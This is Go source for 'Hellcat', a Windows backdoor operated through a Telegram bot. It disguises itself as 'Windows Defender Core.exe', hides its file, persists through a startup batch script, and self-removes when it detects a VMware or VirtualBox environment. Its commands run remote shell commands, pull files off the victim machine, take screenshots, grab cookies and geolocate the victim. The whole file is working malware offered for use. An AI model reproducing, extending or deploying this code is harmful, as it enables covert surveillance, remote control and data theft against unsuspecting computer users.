package main

import (
	"bufio"
	"fmt"
	"image/png"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"syscall"
	"time"

	tg "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/kbinani/screenshot"
	"github.com/oschwald/geoip2-golang"
)

const (
	/*
		Telegram bot configurations.
	*/
	API        = ""
	MSG_REPLY  = false
	DEBUG_MODE = false
	TIMEOUT    = 30

	/*
		Hellcat configurations.
	*/
	NNAME         = "Windows Defender Core.exe"
	START_SERVICE = "wininit.bat"
	PAYLOAD_PATH  = "C:\\Users\\Public\\"
	HIDE_FILE     = true

	/*
		Utils
	*/
	VMWARE_PATH = "C:\\Program Files\\VMware\\VMware Tools\\vmtools123.dll"
	VBOX_PATH   = "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxDisp.dll"
)

const HELP = `
	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
	░░░░░ ███████ ]▄▄▄▄▄▄▄▄▃ ░░░░░░░░░░░░
	▂▄▅█████████▅▄▃▂░░░░░ ᵂᵉˡᶜᵒᵐᵉ ᵗᵒ ᴴᵉˡˡᶜᵃᵗ ░░░░░
	I███████████████████].░░░░░░░░░░░░░░░░░
	◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...░░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
	
	❑ Home
   
	/help - Show all commands.
	/kill - Kill current running backdoor.
	/remove - Self-Remove current backdoor.

	❑ Tools
	
	/shell, /sh <cmd> - Reverse shell from client machine.
	/download <path> - Download file from client machine.
	/cookie <name> <url> - Retrieve the website's cookies from client.
	/screen <name> - Screenshot client display.
	/geoip <city-mmdb> - Retrieve the client geolocation from IPv4.
`

func argument(command, cut string, args int) string {
	recv := strings.Split(command, cut)
	for len(recv) == args {
		time.Sleep(3 * time.Second)
		continue
	}
	return recv[args]
}

func hiddenAttribute(file string) {
	utf16file, err := syscall.UTF16PtrFromString(file)
	if err != nil {
		log.Panic(err)
	}
	if HIDE_FILE {
		if err = syscall.SetFileAttributes(utf16file, syscall.FILE_ATTRIBUTE_HIDDEN); err != nil {
			log.Panic(err)
		}
	}
}

func startup(file string) string {
	user, err := user.Current()
	if err != nil {
		log.Panic(err)
	}
	return "C:\\Users\\" + argument(user.Username, "\\", 1) +
		"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file
}

func path(autostart bool) string {
	if autostart {
		os.Rename(os.Args[0], PAYLOAD_PATH+NNAME)
		hiddenAttribute(PAYLOAD_PATH + NNAME)
		createFile(START_SERVICE, "cmd /c start /b \"\" /d \""+PAYLOAD_PATH+"\" \""+NNAME+"\"")
		os.Rename(path(false)+"\\"+START_SERVICE, startup(START_SERVICE))
	}
	path, err := os.Getwd()
	if err != nil {
		log.Panic(err)
	}
	return path
}

func selfremove() {
	rmbatch := "@echo off\r\n" +
		"set \"payload_path=" + PAYLOAD_PATH + NNAME + "\"\r\n" +
		"set \"batch_path=%~f0\"\r\n" +
		"set \"service_path=" + startup(START_SERVICE) + "\"\r\n" +
		"start /B cmd.exe /C ping -n 1 127.0.0.1 > nul & " +
		"taskkill /IM \"" + NNAME + "\" /F & " +
		"del del \"%service_path%\" & del \"%batch_path%\" & del /f /q /a:h \"%payload_path%\"\r\n" +
		"exit"
	createFile("rm.bat", rmbatch)
	os.Rename(path(false)+"\\rm.bat", startup("rm.bat"))
	rShell("shutdown /r /t 0")
}

func rShell(command string) string {
	shell := exec.Command("cmd", "/C", command)
	outshell, err := shell.CombinedOutput()
	if err != nil {
		return string(outshell)
	}
	shell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	oversize := strings.Trim(string(command), " ") + "_" + "shell.txt"
	/*
		9500 charcters is a lenght limit for makrdown.
	*/
	if len(string(outshell)) > 9500 {
		createFile(oversize, string(outshell))
		hiddenAttribute(path(false) + "\\" + oversize)
		return "Creating file for oversize characters...\n\n" +
			"File Name: " + oversize + "\n" +
			"File Path: " + path(false) + "\\" + oversize +
			"\nHidden Attribute: " + strconv.FormatBool(HIDE_FILE)
	}
	return string(outshell)
}

func createFile(fileName, data string) {
	file, err := os.Create(fileName)
	if err != nil {
		log.Panic(err)
	}
	defer file.Close()
	writer := bufio.NewWriter(file)
	if _, err = writer.WriteString(data); err != nil {
		log.Panic(err)
	}
	writer.Flush()
}

func download(id int64, path string) tg.DocumentConfig {
	return tg.NewDocumentUpload(id, path)
}

func httpReq(method, url string) *http.Response {
	client := &http.Client{}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.Panic(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Panic(err)
	}
	return resp
}

func cookies(fileName, url string) string {
	cookies := httpReq("GET", url).Cookies()
	for _, cookie := range cookies {
		createFile(fileName, "cookie: "+cookie.Name+"="+cookie.Value)
	}
	hiddenAttribute(path(false) + "\\" + fileName)
	return "Cookies Name: " + fileName +
		"\nCookies Path: " + path(false) + "\\" + fileName +
		"\nHidden Attribute: " + strconv.FormatBool(HIDE_FILE)
}

func captureScreen(fileName string) string {
	display := screenshot.NumActiveDisplays()
	for i := 0; i < display; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Panic(err)
		}
		screen, err := os.Create(fileName)
		if err != nil {
			log.Panic(err)
		}
		defer screen.Close()
		png.Encode(screen, img)
	}
	hiddenAttribute(path(false) + "\\" + fileName)
	return "Image Name: " + fileName + "\n" +
		"Image Path: " + path(false) + "\\" + fileName +
		"\nHidden Attribute: " + strconv.FormatBool(HIDE_FILE)
}

func geoip(mmdb string) string {
	body, err := io.ReadAll(httpReq("GET", "https://api.ipify.org").Body)
	if err != nil {
		log.Panic(err)
	}
	db, err := geoip2.Open(mmdb)
	if err != nil {
		return "MMDB file not found...\n" +
			"Here is a link to download it: https://www.maxmind.com"
	}
	defer db.Close()
	ip := net.ParseIP(string(body))
	record, err := db.City(ip)
	if err != nil {
		log.Panic(err)
	}

	/*
		Lazy float convert.
	*/
	Cordinates := fmt.Sprintf("%v, %v", record.Location.Latitude, record.Location.Longitude)

	return "Country: " + record.Country.Names["en"] +
		"\nCity: " + record.City.Names["en"] +
		"\nTime Zone: " + record.Location.TimeZone +
		"\nCordinates: " + Cordinates +
		"\nPublic IPv4: " + string(body)
}

func locate(fpath string) bool {
	_, err := os.Stat(fpath)
	return os.IsNotExist(err)
}

func main() {
	if locate(startup(START_SERVICE)) {
		path(true)
	}
	if !locate(VMWARE_PATH) || !locate(VBOX_PATH) {
		selfremove()
	} else {
		bot, err := tg.NewBotAPI(API)
		if err != nil {
			log.Panic(err)
		}
		bot.Debug = DEBUG_MODE

		u := tg.NewUpdate(0)
		u.Timeout = TIMEOUT

		updates, err := bot.GetUpdatesChan(u)
		if err != nil {
			log.Panic(err)
		}
		for update := range updates {
			if update.Message != nil {
				telComd := update.Message.Command()
				chatID := update.Message.Chat.ID
				msg := tg.NewMessage(chatID, "")
				/*
					Use to set-up Telegram command.
				*/
				command := func() string { return strings.Trim(update.Message.Text, "/"+telComd) }

				if MSG_REPLY {
					msg.ReplyToMessageID = update.Message.MessageID
				}

				go func() {
					switch telComd {
					case "help", "start":
						msg.Text = HELP
					case "kill":
						os.Exit(0)
					case "remove":
						selfremove()
					case "shell", "sh":
						msg.Text = rShell(command())
					case "cookie":
						msg.Text = cookies(argument(command(), " ", 1), argument(command(), " ", 2))
					case "download":
						bot.Send(download(chatID, argument(command(), " ", 1)))
					case "screen":
						msg.Text = captureScreen(argument(command(), " ", 1))
					case "geoip":
						msg.Text = geoip(argument(command(), " ", 1))
					}
					bot.Send(msg)
				}()
			}
		}
	}
}
